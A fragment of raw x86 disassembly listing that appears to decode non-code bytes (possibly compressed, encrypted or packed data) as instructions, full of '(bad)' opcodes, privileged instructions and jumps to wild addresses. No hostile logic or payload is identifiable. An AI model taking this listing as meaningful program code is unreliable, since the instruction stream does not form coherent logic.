  413cc1:	sbb    ecx,DWORD PTR [eax-0x28]
  413cc4:	aas    
  413cc5:	rol    BYTE PTR [esi-0x1c],cl
  413cc8:	cs pop es
  413cca:	scas   eax,DWORD PTR es:[edi]
  413ccb:	xchg   esi,eax
  413ccc:	jecxz  0x413cec
  413cce:	lock inc esi
  413cd0:	adc    edi,DWORD PTR [edi]
  413cd2:	mov    dh,0x37
  413cd4:	aam    0xa0
  413cd6:	fwait
  413cd7:	pop    ds
  413cd8:	arpl   WORD PTR [ecx+ebx*2+0x4a],bp
  413cdc:	lods   al,BYTE PTR ds:[esi]
  413cdd:	stos   DWORD PTR es:[edi],eax
  413cde:	or     BYTE PTR [edi+0x10],dh
  413ce1:	inc    eax
  413ce2:	cmp    DWORD PTR [ecx-0x4b],0x1d78a8cc
  413ce9:	ja     0x413d62
  413ceb:	loopne 0x413d61
  413ced:	cdq    
  413cee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cef:	jae    0x413cda
  413cf1:	shr    DWORD PTR [ecx-0x41f3629e],1
  413cf7:	push   cs
  413cf8:	arpl   bx,dx
  413cfa:	aaa    
  413cfb:	inc    ecx
  413cfc:	pop    ecx
  413cfd:	jge    0x413c85
  413cff:	xor    DWORD PTR [esi-0x79b18142],0xffffffb5
  413d06:	into   
  413d07:	mov    edi,0x7bfdbbe2
  413d0c:	leave  
  413d0d:	push   es
  413d0e:	or     BYTE PTR [eax+0x1],dh
  413d11:	sti    
  413d12:	stos   BYTE PTR es:[edi],al
  413d13:	out    0x8,eax
  413d15:	dec    edx
  413d16:	mov    ch,0x2
  413d18:	in     eax,0x5c
  413d1a:	xor    BYTE PTR [ebp+edi*1+0x52775d7f],ah
  413d21:	outs   dx,BYTE PTR ss:[esi]
  413d23:	cmp    eax,0x5593622a
  413d28:	xchg   esi,eax
  413d29:	sub    edi,DWORD PTR [edx+0x6601639f]
  413d2f:	fiadd  DWORD PTR [ebp-0x42bb5ce1]
  413d35:	xor    esp,ecx
  413d37:	xchg   ecx,eax
  413d38:	mov    ds:0x83ebf42f,al
  413d3d:	mov    dl,0x98
  413d3f:	jmp    0x413d11
  413d41:	fwait
  413d42:	mov    al,ds:0x633327
  413d47:	sahf   
  413d48:	loopne 0x413d9b
  413d4a:	call   0x7db46517
  413d4f:	pop    ebx
  413d50:	add    eax,0xc0382e05
  413d55:	dec    ebp
  413d56:	loopne 0x413d6e
  413d58:	aam    0x87
  413d5a:	int    0x65
  413d5c:	int    0x91
  413d5e:	mov    edi,0x605bbcb4
  413d63:	fidivr DWORD PTR [eax-0x1ff47fcc]
  413d69:	xor    al,0xc1
  413d6b:	push   DWORD PTR fs:[esp+edx*2+0x37]
  413d70:	xchg   DWORD PTR [esi],edx
  413d72:	iret   
  413d73:	ins    DWORD PTR es:[edi],dx
  413d74:	pop    edx
  413d75:	push   esi
  413d76:	stos   DWORD PTR es:[edi],eax
  413d77:	jmp    0xa503:0xa00a0984
  413d7e:	adc    DWORD PTR [esi-0x618b2c55],ebx
  413d84:	dec    esp
  413d85:	sub    ecx,ecx
  413d87:	je     0x413dc2
  413d89:	push   ebx
  413d8a:	loopne 0x413dcd
  413d8c:	inc    esi
  413d8d:	rdmsr  
  413d8f:	fstp   TBYTE PTR [edi]
  413d91:	enter  0xdb3d,0x5d
  413d95:	cmp    dl,BYTE PTR [edi-0x70]
  413d98:	into   
  413d99:	je     0x413d31
  413d9b:	repz not cl
  413d9e:	lods   eax,DWORD PTR ds:[esi]
  413d9f:	add    eax,0x141209d0
  413da4:	pop    eax
  413da5:	mov    DWORD PTR [esi],ebx
  413da7:	jmp    DWORD PTR [ecx+0x7a]
  413dab:	and    BYTE PTR [ebp-0x510a9f83],bl
  413db1:	lds    esp,FWORD PTR [ebp-0x80]
  413db4:	idiv   BYTE PTR [edx-0x1a]
  413db7:	xchg   esp,eax
  413db8:	cs test al,0x2f
  413dbb:	xor    al,0x23
  413dbd:	mov    BYTE PTR [esi-0x4447d234],bh
  413dc3:	stc    
  413dc4:	inc    eax
  413dc5:	loopne 0x413d71
  413dc7:	retf   0xac4d
  413dca:	fdiv   QWORD PTR [ebx+0x7c2929c9]
  413dd0:	imul   eax,DWORD PTR [ecx+edx*8-0x5],0x1c
  413dd5:	mov    ebp,0x18fc4d5d
  413dda:	mov    ch,0xeb
  413ddc:	pop    eax
  413ddd:	std    
  413dde:	xor    DWORD PTR [edi+eax*2+0x69],edx
  413de2:	jle    0x413da0
  413de4:	fstp   QWORD PTR [eax+0x4d]
  413de7:	dec    dl
  413de9:	and    edx,DWORD PTR [ebp-0x48029326]
  413def:	cdq    
  413df0:	sub    edx,DWORD PTR [edi-0x59]
  413df3:	add    BYTE PTR [edx+0x3e],dh
  413df6:	mov    dl,0xd8
  413df8:	imul   esi,DWORD PTR [edi+0x6e],0x52
  413dfc:	cs push 0xe9a48f3
  413e02:	mov    ebp,0xbc1c996c
  413e07:	ins    BYTE PTR es:[edi],dx
  413e08:	sahf   
  413e09:	sbb    DWORD PTR [edi],ecx
  413e0b:	add    ch,BYTE PTR ds:0x191610b1
  413e11:	mov    DWORD PTR [esi],ecx
  413e13:	call   0x94b61aed
  413e18:	or     dh,BYTE PTR [eax-0x78ba6de1]
  413e1e:	cmp    dh,BYTE PTR ds:0xaf01826c
  413e24:	test   DWORD PTR [ebp+0x40ddb03c],ebp
  413e2a:	ins    DWORD PTR es:[edi],dx
  413e2b:	pop    edi
  413e2c:	jne    0x413dc9
  413e2e:	adc    eax,0xe55151ac
  413e33:	fcom   QWORD PTR [eax+0x3e779973]
  413e39:	xchg   ecx,eax
  413e3a:	aaa    
  413e3b:	push   0xffffff8c
  413e3d:	adc    ch,BYTE PTR gs:[eax+esi*4-0x249f1fc3]
  413e45:	jmp    0x809b719d
  413e4a:	or     dl,BYTE PTR [ecx]
  413e4c:	fisub  WORD PTR [esi-0x2e]
  413e4f:	dec    esi
  413e50:	pop    esi
  413e51:	xor    cl,BYTE PTR [edi]
  413e53:	dec    esi
  413e54:	sbb    eax,0x10a54bfe
  413e59:	add    bl,BYTE PTR [ebx+0x1eea0412]
  413e5f:	jns    0x413df6
  413e61:	int    0x85
  413e63:	sbb    ebp,DWORD PTR [esi-0x6d4d5fe3]
  413e69:	sub    al,BYTE PTR [esi+0x3494cf8c]
  413e6f:	jbe    0x413ed6
  413e71:	shl    DWORD PTR [edi+0x5f],1
  413e74:	hlt    
  413e75:	xchg   esi,eax
  413e76:	arpl   sp,ax
  413e78:	into   
  413e79:	not    DWORD PTR [edi+0x78]
  413e7c:	mov    edx,0x6b2b31c6
  413e81:	inc    ebp
  413e82:	xor    al,0x22
  413e85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e86:	call   0xb186bcce
  413e8b:	sub    BYTE PTR [edx],0xde
  413e8e:	rol    BYTE PTR [edi],1
  413e90:	sbb    dh,BYTE PTR [edi]
  413e92:	or     esi,ebx
  413e94:	fist   DWORD PTR [edi]
  413e96:	inc    esp
  413e97:	ins    BYTE PTR es:[edi],dx
  413e98:	or     BYTE PTR [esi+0x6e],0x9a
  413e9c:	out    dx,al
  413e9d:	or     BYTE PTR [edx+0x226dba53],0xc0
  413ea4:	push   0xab3a9743
  413ea9:	retf   
  413eaa:	stc    
  413eab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413eac:	dec    edi
  413ead:	jne    0x413ea7
  413eaf:	dec    esp
  413eb0:	mov    cl,0xc5
  413eb2:	sub    DWORD PTR [ebx],edx
  413eb4:	out    0x5f,eax
  413eb6:	xlat   BYTE PTR ds:[ebx]
  413eb7:	stos   DWORD PTR es:[edi],eax
  413eb8:	(bad)  
  413eb9:	push   esi
  413eba:	jmp    0xd29a4672
  413ebf:	and    DWORD PTR [edx-0xc276471],edi
  413ec5:	(bad)  
  413ec6:	cli    
  413ec7:	jl     0x413ed0
  413ec9:	icebp  
  413eca:	inc    eax
  413ecb:	or     eax,0x5aa2737c
  413ed0:	enter  0xcd69,0x95
  413ed4:	repnz rcr DWORD PTR [edx],1
  413ed7:	gs jp  0x413ef2
  413eda:	ja     0x413f4f
  413edc:	enter  0xd94c,0x46
  413ee0:	pop    ss
  413ee1:	(bad)  
  413ee2:	fistp  DWORD PTR [ecx-0x7b]
  413ee5:	lock cmp DWORD PTR [eax-0x4836549],eax
  413eec:	les    eax,FWORD PTR [esi+0x36fba0b0]
  413ef2:	mov    esp,0x32ae549
  413ef7:	mov    DWORD PTR [edi+0x1d],ebp
  413efa:	ins    DWORD PTR es:[edi],dx
  413efb:	add    ecx,DWORD PTR [esi+0x310f6c3f]
  413f01:	push   ebp
  413f02:	jmp    FWORD PTR [edi+ecx*1+0x16]
  413f06:	mov    ecx,0x72453b0d
  413f0b:	xor    al,0xc7
  413f0d:	add    ebp,DWORD PTR ds:0xb2e536ba
  413f13:	pop    edi
  413f14:	(bad)  ds:0xd461a9a3
  413f1a:	xchg   edx,eax
  413f1b:	ret    
  413f1c:	cmp    eax,0xb7a50037
  413f21:	cs push edi
  413f23:	loopne 0x413f32
  413f25:	sub    dl,dl
  413f27:	jno    0x413f19
  413f29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f2a:	aaa    
  413f2b:	mov    gs,WORD PTR [ebx]
  413f2d:	mov    cl,0xc8
  413f2f:	rcl    DWORD PTR ds:0xb5680d45,1
  413f35:	imul   bl
  413f37:	adc    ch,ah
  413f39:	jle    0x413ef4
  413f3b:	push   esi
  413f3c:	(bad)  
  413f3d:	sti    
  413f3e:	push   DWORD PTR [ecx]
  413f40:	arpl   bx,sp
  413f42:	jae    0x413ef9
  413f44:	pop    edx
  413f45:	(bad)  
  413f46:	fistp  WORD PTR [eax-0x57]
  413f49:	imul   edx,ebx,0x670aca57
  413f4f:	fwait
  413f50:	push   edi
  413f51:	in     eax,dx
  413f52:	push   ebx
  413f53:	lods   al,BYTE PTR ds:[esi]
  413f54:	xchg   ecx,eax
  413f55:	add    DWORD PTR [ecx],ebx
  413f57:	(bad)  
  413f58:	push   ss
  413f59:	dec    edx
  413f5a:	das    
  413f5b:	dec    ecx
  413f5c:	popa   
  413f5d:	cwde   
  413f5e:	mov    esp,0xa9346a47
  413f63:	xchg   edi,eax
  413f64:	lods   al,BYTE PTR ds:[esi]
  413f65:	push   ebp
  413f66:	cmp    esp,DWORD PTR [ebx+0x360a5495]
  413f6c:	dec    edx
  413f6d:	outs   dx,DWORD PTR ds:[esi]
  413f6e:	xor    ebx,ebx
  413f70:	popa   
  413f71:	lock xor bl,0x25
  413f75:	inc    esi
  413f76:	and    dh,0x42
  413f79:	dec    esi
  413f7a:	push   esi
  413f7b:	jmp    0x3b553d6d
  413f80:	hlt    
  413f81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f82:	fisubr DWORD PTR [esi]
  413f84:	mov    dl,0x65
  413f86:	enter  0x9273,0x96
  413f8a:	icebp  
  413f8b:	cld    
  413f8c:	push   ss
  413f8d:	and    bl,BYTE PTR [ebp-0x2f]
  413f90:	or     BYTE PTR [edi+0x66],ch
  413f93:	push   edx
  413f94:	or     eax,DWORD PTR [edx+0x4c]
  413f97:	pop    ebp
  413f98:	push   esp
  413f99:	repnz aas 
  413f9b:	and    BYTE PTR [edi],al
  413f9d:	jb     0x413fc5
  413f9f:	push   eax
  413fa0:	add    eax,0x7b30d86e
  413fa5:	mov    eax,0xa43cbf13
  413faa:	or     edi,edi
  413fac:	scas   al,BYTE PTR es:[edi]
  413fad:	dec    ecx
  413fae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413faf:	sub    al,0x35
  413fb1:	fwait
  413fb2:	mov    bl,BYTE PTR [edi]
  413fb4:	popf   
  413fb5:	mov    ah,0xa
  413fb7:	call   0x9e9a290d
  413fbc:	jg     0x413fdd
  413fbe:	ins    BYTE PTR es:[edi],dx
  413fbf:	cli    
  413fc0:	push   ecx
  413fc1:	inc    edx
  413fc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fc3:	aas    
  413fc4:	push   es
  413fc5:	xor    bl,BYTE PTR [edx]
  413fc7:	xor    al,0x58
  413fc9:	mov    ebx,eax
  413fcb:	lds    edi,FWORD PTR [edx-0x43c94cb7]
  413fd1:	xor    bh,cl
  413fd3:	push   ebp
  413fd4:	ins    BYTE PTR es:[edi],dx
  413fd5:	dec    eax
  413fd6:	adc    eax,DWORD PTR [esi-0x10]
  413fd9:	loop   0x413fad
  413fdb:	xor    DWORD PTR [ebx],esp
  413fdd:	sahf   
  413fde:	popa   
  413fdf:	fwait
  413fe0:	lods   al,BYTE PTR ds:[esi]
  413fe1:	mov    ecx,0x7ff6ab52
  413fe6:	(bad)  
  413fe7:	xchg   BYTE PTR [ebx],dh
  413fe9:	gs inc edx
  413feb:	xchg   esp,eax
  413fec:	pop    edx
  413fed:	stc    
  413fee:	lods   al,BYTE PTR ds:[esi]
  413fef:	mov    ah,0xf7
  413ff1:	mov    bh,0x63
  413ff3:	jbe    0x414054
  413ff5:	dec    esp
  413ff6:	loopne 0x414071
  413ff8:	sub    ebp,DWORD PTR [ecx-0x2]
  413ffb:	jnp    0x413fe3
  413ffd:	enter  0xb7a5,0xa3
  414001:	scas   al,BYTE PTR es:[edi]
  414002:	fcmovnb st,st(3)
  414004:	scas   eax,DWORD PTR es:[edi]
  414005:	rol    DWORD PTR [ebp-0x19dafa35],1
  41400b:	nop
  41400c:	mov    cl,0x25
  41400e:	push   esp
  41400f:	int3   
  414010:	das    
  414011:	dec    edi
  414012:	cmp    eax,0xa3e1d045
  414017:	adc    al,0xc5
  414019:	cmp    DWORD PTR [bx+si-0x32a9],esp
  41401e:	test   al,0x16
  414020:	outs   dx,DWORD PTR ds:[esi]
  414021:	or     eax,0x458ae1d2
  414026:	test   ebx,0xa52e545a
  41402c:	js     0x414076
  41402e:	cmp    esi,DWORD PTR [esi]
  414030:	mov    dh,al
  414032:	push   ebp
  414033:	pusha  
  414034:	sbb    DWORD PTR [eax+0x4ec61434],ebx
  41403a:	nop
  41403b:	or     eax,0x7870af84
  414040:	test   DWORD PTR [edi+0x4d612ec9],ebx
  414046:	dec    esi
  414047:	fcom   QWORD PTR [ecx]
  414049:	push   ss
  41404a:	int    0x8
  41404c:	push   0xffffffc5
  41404e:	aaa    
  41404f:	js     0x413fed
  414051:	ds out 0x50,al
  414054:	fpatan 
  414056:	fist   WORD PTR [ebp-0x2f]
  414059:	inc    edi
  41405a:	stc    
  41405b:	jo     0x41406f
  41405d:	inc    ebx
  41405e:	sub    al,0x1b
  414060:	pop    esi
  414061:	push   ds
  414062:	pop    ebp
  414063:	xor    esi,DWORD PTR [ecx-0x7b72b312]
  414069:	out    0xcf,al
  41406b:	mov    cs,WORD PTR [eax]
  41406d:	lods   al,BYTE PTR ds:[esi]
  41406e:	sub    al,0x7b
  414070:	lahf   
  414071:	daa    
  414072:	sar    DWORD PTR [ebx+0x56],1
  414075:	cmp    BYTE PTR [ebx],0x71
  414078:	inc    edx
  414079:	mov    ah,BYTE PTR [esi]
  41407b:	mov    ah,0xec
  41407d:	pop    esp
  41407e:	sub    bh,BYTE PTR [ebx]
  414080:	inc    edx
  414081:	xlat   BYTE PTR ds:[ebx]
  414082:	add    BYTE PTR [ecx],dl
  414084:	mov    WORD PTR [edx-0x2f],?
  414087:	inc    esp
  414088:	jg     0x414024
  41408a:	sbb    bh,dl
  41408c:	push   edx
  41408d:	fistp  WORD PTR [edi-0x216919da]
  414093:	jmp    0x74a6:0x79859693
  41409a:	out    dx,al
  41409b:	nop
  41409c:	test   DWORD PTR [esi],eax
  41409e:	mov    cl,0x92
  4140a0:	mov    dh,0xe7
  4140a2:	mov    esi,0x6d9865c4
  4140a7:	mov    WORD PTR [ecx+0x5d6da437],ss
  4140ad:	stos   DWORD PTR es:[edi],eax
  4140ae:	fidivr WORD PTR [eax]
  4140b0:	lahf   
  4140b1:	push   0x44b22f89
  4140b6:	(bad)  
  4140b7:	retf   0x5b35
  4140ba:	aad    0xc8
  4140bc:	jb     0x4140c8
  4140be:	lock test BYTE PTR [ebx-0x2b346516],dl
  4140c5:	adc    eax,0x3aa23176
  4140ca:	mov    ebx,0xb9c47ef7
  4140cf:	sbb    DWORD PTR ds:0x97bbe003,esp
  4140d5:	or     bl,cl
  4140d7:	lahf   
  4140d8:	xchg   ebp,eax
  4140d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140da:	cld    
  4140db:	sub    ecx,ecx
  4140dd:	sahf   
  4140de:	sahf   
  4140df:	aad    0xd9
  4140e1:	call   0xe8bc7d3b
  4140e6:	push   0x22
  4140e8:	jo     0x4140ae
  4140ea:	lea    ebp,[eax+0x72]
  4140ed:	xchg   edx,eax
  4140ee:	xor    BYTE PTR [edx-0x4938458e],bl
  4140f4:	inc    ecx
  4140f5:	jns    0x4140da
  4140f7:	mov    esp,0x7ef41158
  4140fc:	(bad)  
  4140fd:	das    
  4140fe:	data16 scas al,BYTE PTR es:[edi]
  414100:	add    eax,DWORD PTR [edi]
  414102:	dec    ebp
  414103:	(bad)  
  414104:	loopne 0x41414a
  414106:	mov    ebp,0x1693da0e
  41410b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41410c:	or     ebp,DWORD PTR [eax]
  41410e:	fstp   TBYTE PTR fs:[edi+0x10]
  414112:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414113:	adc    al,0xf7
  414115:	and    dh,0x2f
  414118:	and    eax,0xb1ef3b93
  41411d:	xor    DWORD PTR [edi],ecx
  41411f:	push   ss
  414120:	cs mov ?,edi
  414123:	xchg   esi,eax
  414124:	sbb    al,0xaa
  414126:	jb     0x414135
  414128:	lods   eax,DWORD PTR ds:[esi]
  414129:	in     al,dx
  41412a:	mov    bl,0xdd
  41412c:	sub    BYTE PTR [esi+esi*8+0x55],al
  414130:	mov    esp,0x8bb27391
  414135:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414137:	lahf   
  414138:	sub    ebp,DWORD PTR [eax+0x33f05f28]
  41413e:	aad    0xed
  414140:	pop    ebx
  414141:	nop
  414142:	xor    edi,DWORD PTR [edx+0x39766df]
  414148:	xor    DWORD PTR [ebx+0x64],0xab07f969
  41414f:	push   eax
  414150:	mov    eax,ds:0x3abc4071
  414155:	mov    ah,0xf7
  414157:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414158:	or     dh,dh
  41415a:	inc    eax
  41415b:	jp     0x4141be
  41415d:	dec    ecx
  41415e:	jno    0x414163
  414160:	je     0x414170
  414162:	dec    esp
  414163:	ret    0x4fb
  414166:	ret    
  414167:	mov    al,0xce
  414169:	loopne 0x4140f9
  41416b:	push   ds
  41416c:	addr16 xor eax,0x83331221
  414172:	pop    ss
  414173:	mov    edi,0xa727b111
  414178:	sub    esi,edi
  41417a:	add    al,0x4d
  41417c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41417d:	clc    
  41417e:	mov    eax,0x86f191e2
  414183:	iret   
  414184:	or     al,al
  414186:	(bad)  [ebx+0x2a18a590]
  41418c:	jae    0x4141fe
  41418e:	nop
  41418f:	aad    0x7b
  414191:	enter  0xb4e2,0x6a
  414195:	adc    al,0xc1
  414197:	js     0x4141b1
  414199:	pop    ds
  41419a:	gs ret 
  41419c:	fisub  DWORD PTR [ebx+esi*8-0x51]
  4141a0:	in     al,0x17
  4141a2:	push   es
  4141a3:	pop    ebx
  4141a4:	or     eax,0xb5cb51eb
  4141a9:	sub    ah,BYTE PTR gs:[esi-0x31]
  4141ad:	mov    WORD PTR [ebx-0xf],?
  4141b0:	mov    eax,ds:0x587161b9
  4141b5:	repz scas al,BYTE PTR es:[edi]
  4141b7:	mov    edx,0xe3b2311e
  4141bc:	(bad)  
  4141bd:	fucom  st(7)
  4141bf:	mov    eax,0x9c737115
  4141c4:	test   al,0xeb
  4141c6:	(bad)  
  4141c7:	xor    DWORD PTR [eax+esi*2-0x7f9a1346],edx
  4141ce:	js     0x414228
  4141d0:	out    0x52,al
  4141d2:	in     eax,dx
  4141d3:	retf   0x9754
  4141d6:	jle    0x414164
  4141d8:	or     ah,BYTE PTR [ecx+0x1097acbc]
  4141de:	xchg   esi,eax
  4141df:	iret   
  4141e0:	ret    
  4141e1:	imul   edi,DWORD PTR [esi+0x4a],0x143887df
  4141e8:	sub    al,0x29
  4141ea:	repnz sub al,0x2c
  4141ed:	cs xchg ebp,eax
  4141ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141f0:	jp     0x414219
  4141f2:	push   eax
  4141f3:	retf   0xf3ff
  4141f6:	inc    ebp
  4141f7:	shl    DWORD PTR [eax+0x4390a4fc],0x7e
  4141fe:	mov    ds:0x56426d81,eax
  414203:	imul   esi,DWORD PTR [ebp-0x31],0xe23d6bf
  41420a:	jge    0x414198
  41420c:	push   0x45
  41420e:	daa    
  41420f:	push   esp
  414210:	mov    edi,DWORD PTR [edx]
  414212:	push   ecx
  414213:	fadd   QWORD PTR ds:0xe1c597b1
  414219:	mov    WORD PTR [edi+0xd],fs
  41421c:	(bad)  
  41421d:	mov    cl,0xae
  41421f:	lods   eax,DWORD PTR ds:[esi]
  414220:	pop    es
  414221:	mov    WORD PTR [esi],cs
  414223:	test   al,0x77
  414225:	push   cs
  414226:	addr16 or edx,esi
  414229:	cmp    al,0xab
  41422b:	sub    dh,bl
  41422d:	sbb    DWORD PTR [edx+0x17],esi
  414230:	push   cs
  414231:	inc    eax
  414232:	hlt    
  414233:	je     0x4141e6
  414235:	icebp  
  414236:	(bad)  
  414237:	sbb    BYTE PTR [edx+0x3e5012d5],al
  41423d:	outs   dx,BYTE PTR ds:[esi]
  41423e:	and    DWORD PTR [ebp+0x4df999a9],esp
  414244:	fs mov dh,ch
  414247:	scas   al,BYTE PTR es:[edi]
  414248:	imul   ebp,edi,0x9c84bbf0
  41424e:	pop    edi
  41424f:	jne    0x414286
  414251:	(bad)  
  414252:	shr    BYTE PTR [ecx-0x25613018],cl
  414258:	enter  0x60f7,0x1
  41425c:	mov    ah,0x5d
  41425e:	xor    ecx,DWORD PTR [edx+eiz*2+0x4c0ba441]
  414265:	cwde   
  414266:	ds in  eax,0x79
  414269:	js     0x414241
  41426b:	pushf  
  41426c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41426d:	pop    edx
  41426e:	addr16 addr16 push eax
  414271:	pop    edi
  414272:	fwait
  414273:	sub    esi,DWORD PTR [eax+ebx*4-0x15]
  414277:	mov    ds:0xc054bb6d,eax
  41427c:	mov    eax,ds:0x2b21eae5
  414281:	mov    esi,0xeb2d0fd9
  414286:	cmp    DWORD PTR [edi+0xdc298b7],eax
  41428c:	ja     0x414285
  41428e:	pushf  
  41428f:	pop    eax
  414290:	mov    ebx,0xf0adae2c
  414295:	mov    bh,0x3e
  414297:	fistp  DWORD PTR [eax+edi*4]
  41429a:	cmp    edi,DWORD PTR ss:[esi-0xd]
  41429e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41429f:	(bad)  
  4142a0:	aaa    
  4142a1:	mov    ds:0xa014a5c3,eax
  4142a6:	pop    ebp
  4142a7:	ins    DWORD PTR es:[edi],dx
  4142a8:	fadd   st(3),st
  4142aa:	pop    ecx
  4142ab:	xor    BYTE PTR [esi],ch
  4142ad:	jbe    0x41432a
  4142af:	add    al,0x7b
  4142b1:	or     al,0x32
  4142b3:	fdiv   QWORD PTR ds:0xe85d2c76
  4142b9:	and    BYTE PTR [ebp-0x47],cl
  4142bc:	rcr    cl,1
  4142be:	push   edi
  4142bf:	sti    
  4142c0:	cli    
  4142c1:	imul   ebp,edx,0xffffffdc
  4142c4:	cmp    cl,BYTE PTR [esp+ebp*4+0x34]
  4142c8:	in     eax,0x30
  4142ca:	cli    
  4142cb:	ins    DWORD PTR es:[edi],dx
  4142cc:	inc    ebp
  4142cd:	xchg   edx,eax
  4142ce:	adc    eax,0x13e3667b
  4142d3:	fimul  WORD PTR [eax]
  4142d5:	inc    edi
  4142d6:	bound  ebp,QWORD PTR [ebp-0x193f0e72]
  4142dc:	fcomip st,st(5)
  4142de:	lods   eax,DWORD PTR ds:[esi]
  4142df:	lahf   
  4142e0:	dec    ecx
  4142e1:	lds    eax,FWORD PTR [esi]
  4142e3:	push   cs
  4142e4:	pop    es
  4142e5:	inc    eax
  4142e6:	mov    esp,0x14bfa7da
  4142eb:	xchg   edi,eax
  4142ec:	stc    
  4142ed:	sbb    dl,BYTE PTR [ecx-0x5c6453c2]
  4142f3:	shl    BYTE PTR [ebx+0x195dc209],cl
  4142f9:	mov    ds:0xa1e37ab4,eax
  4142fe:	or     DWORD PTR [edi-0x40c42348],eax
  414304:	and    BYTE PTR [edi-0x2554d42],dl
  41430a:	addr16 mov ds:0xb3f5,eax
  41430e:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414310:	or     BYTE PTR ds:0x72587fb1,bl
  414316:	adc    BYTE PTR [ebx],0xfd
  414319:	mov    DWORD PTR [ebx-0x349e234c],ecx
  41431f:	fadd   QWORD PTR [eax]
  414321:	test   DWORD PTR [ebx+0x29917261],0x49407de4
  41432b:	sbb    BYTE PTR [edi+0x4a9f42d2],al
  414331:	inc    esi
  414332:	jp     0x41439a
  414334:	xchg   ebp,eax
  414335:	and    ebp,edx
  414337:	(bad)  
  414338:	dec    edx
  414339:	mov    ch,0xac
  41433b:	scas   eax,DWORD PTR es:[edi]
  41433c:	cdq    
  41433d:	sbb    al,0xb8
  41433f:	xlat   BYTE PTR ds:[ebx]
  414340:	cmp    edi,DWORD PTR [ecx-0x15]
  414343:	inc    edi
  414344:	jnp    0x41436e
  414346:	sub    dl,BYTE PTR [ecx+0x10]
  414349:	dec    edi
  41434a:	ins    BYTE PTR es:[edi],dx
  41434b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41434c:	sub    bl,dl
  41434e:	test   DWORD PTR [eax],esp
  414350:	bound  edx,QWORD PTR [eax+0x138aa8c5]
  414356:	mov    ebp,DWORD PTR [ebx+0x4a]
  414359:	fdiv   QWORD PTR [edi+0x20182f14]
  41435f:	mov    WORD PTR [esi],?
  414361:	inc    esp
  414362:	(bad)  
  414363:	fwait
  414364:	dec    edx
  414365:	mov    edx,0xd065d8a7
  41436a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41436b:	call   esp
  41436d:	ret    
  41436e:	mov    eax,0x67fe79eb
  414373:	add    al,0x4c
  414375:	inc    edi
  414376:	jl     0x414344
  414378:	daa    
  414379:	dec    esi
  41437a:	retf   
  41437b:	popf   
  41437c:	invd   
  41437e:	jl     0x4143ba
  414380:	add    al,0x94
  414382:	rcl    ecx,0x2e
  414385:	inc    ebp
  414386:	cwde   
  414387:	mov    WORD PTR [esi-0x384e3309],gs
  41438d:	jp     0x4143b8
  41438f:	ja     0x4143f7
  414391:	inc    ebp
  414392:	lods   eax,DWORD PTR ds:[esi]
  414393:	pop    ecx
  414394:	or     esp,ebx
  414396:	mov    edi,0x70d64d6e
  41439b:	or     dl,bl
  41439d:	lea    esp,[edx+edx*1-0x2a]
  4143a1:	mov    ds:0xb8f8895f,eax
  4143a6:	xlat   BYTE PTR ds:[ebx]
  4143a7:	ss pop esi
  4143a9:	pushf  
  4143aa:	xlat   BYTE PTR ds:[ebx]
  4143ab:	(bad)  
  4143ac:	aas    
  4143ad:	sub    BYTE PTR [eax-0x52],ch
  4143b0:	ds mov cl,0x9b
  4143b3:	cdq    
  4143b4:	in     al,0x79
  4143b6:	ins    BYTE PTR es:[edi],dx
  4143b7:	jae    0x414423
  4143b9:	adc    al,0x9c
  4143bb:	in     eax,0xa4
  4143bd:	shr    BYTE PTR [edx+0x33323bc1],cl
  4143c3:	jne    0x414432
  4143c5:	mov    dl,0xa4
  4143c7:	sbb    esi,edx
  4143c9:	adc    ecx,DWORD PTR [eax-0x10aa575]
  4143cf:	cld    
  4143d0:	xchg   esi,eax
  4143d1:	mov    bh,0x6d
  4143d3:	loope  0x414386
  4143d5:	xor    al,0xbf
  4143d7:	(bad)  [ebx]
  4143d9:	iret   
  4143da:	cmp    ah,BYTE PTR [edx+0x52]
  4143dd:	mov    eax,ds:0xfee1d88c
  4143e2:	leave  
  4143e3:	in     eax,0x28
  4143e5:	call   0x31867fa8
  4143ea:	lock inc ecx
  4143ec:	pusha  
  4143ed:	rol    BYTE PTR [eax-0x58],1
  4143f0:	adc    al,0x98
  4143f2:	dec    ecx
  4143f3:	push   edi
  4143f4:	adc    cl,ch
  4143f6:	mov    eax,esi
  4143f8:	adc    eax,0xe1b4b461
  4143fd:	sahf   
  4143fe:	xor    DWORD PTR ds:0x9a0971aa,ebp
  414404:	xor    esp,DWORD PTR [esp+edx*2+0xe34d56c]
  41440b:	push   ebx
  41440c:	and    eax,DWORD PTR [eax-0xb]
  41440f:	(bad)  
  414410:	mov    esp,0x6839497e
  414415:	adc    al,0x3f
  414417:	xchg   BYTE PTR [ebp+0x30],dh
  41441a:	or     DWORD PTR [ecx-0x5395d62d],ebp
  414420:	push   cs
  414421:	fisttp QWORD PTR [esi-0x13140d34]
  414427:	dec    ecx
  414428:	pop    eax
  414429:	ret    0x785
  41442c:	and    esi,esp
  41442e:	push   edi
  41442f:	fst    QWORD PTR fs:[edi+0x1a2295c9]
  414436:	cmp    eax,0x25737122
  41443b:	dec    edi
  41443c:	inc    esp
  41443d:	sub    eax,DWORD PTR [eax-0x50]
  414440:	mov    WORD PTR [esi],?
  414442:	cmp    al,0xe7
  414444:	popa   
  414445:	aam    0x82
  414447:	mov    DWORD PTR [ecx+0x4c],edi
  41444a:	int    0xfb
  41444c:	(bad)  
  41444d:	sub    al,0xe9
